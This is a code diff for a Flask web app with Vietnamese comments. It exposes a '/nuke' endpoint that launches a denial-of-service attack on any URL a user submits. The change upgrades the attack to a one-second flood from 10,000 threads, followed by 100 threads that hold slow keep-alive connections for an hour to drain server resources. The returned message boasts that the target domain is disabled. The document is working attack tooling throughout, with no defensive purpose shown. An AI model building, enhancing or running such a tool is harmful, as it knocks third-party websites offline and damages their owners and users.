@@ -7,18 +7,37 @@ from flask import Flask, request, render_template, jsonify
 app = Flask(__name__)
 
 attack_running = False
+keep_alive_threads = []
 
-def http_flood(url, duration=60):
-    """Gửi request liên tục đến URL mục tiêu"""
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-    }
-    start_time = time.time()
-    while time.time() - start_time < duration:
+def heavy_flood(url, duration=1):
+    """Bắn request cực nhanh trong 1 giây"""
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'
+    })
+    start = time.time()
+    while time.time() - start < duration:
         try:
-            requests.get(url, headers=headers, timeout=1)
+            session.get(url, timeout=0.01, stream=True)
         except:
             pass
+
+def slow_keep_alive(url, duration=3600):
+    """Giữ kết nối lâu dài bằng cách gửi request thưa dần, làm tốn tài nguyên server"""
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Connection': 'keep-alive'
+    })
+    start = time.time()
+    while time.time() - start < duration:
+        try:
+            session.get(url, timeout=5, stream=True)
+        except:
+            pass
+        time.sleep(2)  # Gửi mỗi 2 giây để giữ kết nối
 
 @app.route('/')
 def index():
@@ -28,7 +47,7 @@ def index():
 def nuke():
     global attack_running
     if attack_running:
-        return jsonify({"status": "error", "message": "Đang có một cuộc tấn công khác"})
+        return jsonify({"status": "error", "message": "Đang có tấn công khác"})
 
     url = request.form.get('url')
     name = request.form.get('name', 'web')
@@ -39,19 +58,33 @@ def nuke():
         url = 'http://' + url
 
     attack_running = True
-    # Tạo 500 luồng tấn công trong 30 giây
+
+    # Giai đoạn 1: Bắn flood cực mạnh trong 1 giây (10000 luồng)
     threads = []
-    for i in range(500):
-        t = threading.Thread(target=http_flood, args=(url, 30))
+    for _ in range(10000):
+        t = threading.Thread(target=heavy_flood, args=(url, 1))
         t.daemon = True
         t.start()
         threads.append(t)
 
-    for t in threads:
-        t.join()
+    # Đợi flood hoàn thành (1 giây + chút thời gian khởi tạo)
+    time.sleep(1.5)
 
+    # Giai đoạn 2: Duy trì kết nối chậm (100 luồng, kéo dài 1 giờ)
+    slow_threads = []
+    for _ in range(100):
+        t = threading.Thread(target=slow_keep_alive, args=(url, 3600))
+        t.daemon = True
+        t.start()
+        slow_threads.append(t)
+
+    # Đánh dấu đã hoàn thành flood, nhưng vẫn giữ slow threads
     attack_running = False
-    return jsonify({"status": "success", "message": f"💥 Miền {name} đã bị vô hiệu hóa! Không thể truy cập."})
+
+    return jsonify({
+        "status": "success",
+        "message": f"💥 Đã tấn công {name} ({url}) trong 1 giây, hiệu ứng kéo dài ~1 giờ (duy trì kết nối chậm)."
+    })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
